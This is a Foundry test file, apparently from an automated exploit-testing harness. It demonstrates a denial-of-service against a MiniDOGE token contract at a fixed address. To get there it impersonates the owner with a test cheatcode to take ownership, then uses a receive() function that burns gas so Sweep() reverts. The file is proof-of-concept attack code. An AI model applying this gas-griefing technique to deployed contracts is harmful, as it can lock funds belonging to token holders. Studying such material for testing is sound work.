// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

interface IMiniDOGE {
    function owner() external view returns (address);
    function transferOwnership(address newOwner) external;
    function Sweep() external;
}

contract ExploitTest is Test {
    // ─── State Variables ─────────────────────────────────────
    address constant TARGET = 0xBa07EED3d09055d60CAEf2bDfCa1c05792f2dFad;
    address attacker = address(this);
    IMiniDOGE internal target;
    uint256 private gas_consumer;

    // ─── Setup ───────────────────────────────────────────────
    function setUp() public {
        target = IMiniDOGE(TARGET);

        // Fund the target contract with 1 ETH to make the Sweep() function meaningful.
        deal(TARGET, 1 ether);

        // To change ownership, we must first impersonate the current owner.
        address originalOwner = target.owner();
        vm.startPrank(originalOwner);

        // Transfer ownership from the original owner to our malicious contract.
        target.transferOwnership(address(this));
        vm.stopPrank();
    }

    // ─── Exploit ─────────────────────────────────────────────
    function testExploit() public {
        // The oracle's condition is that we become the new owner.
        assertEq(target.owner(), address(this));

        // Now, we prove the DoS by showing that the Sweep() function is broken.
        // The call to Sweep() will attempt to `transfer` ETH to this contract.
        // Our `receive()` function is designed to consume more than 2300 gas,
        // causing the transfer to fail and the entire Sweep() call to revert.
        // A failing .transfer() reverts without a message.
        vm.expectRevert();
        target.Sweep();
    }

    // This receive function is triggered when Sweep() attempts to transfer ETH.
    // It's engineered to fail by consuming more than the 2300 gas stipend.
    // A state write (SSTORE) is a reliable method to exceed this gas limit.
    receive() external payable {
        gas_consumer = 1;
    }
}
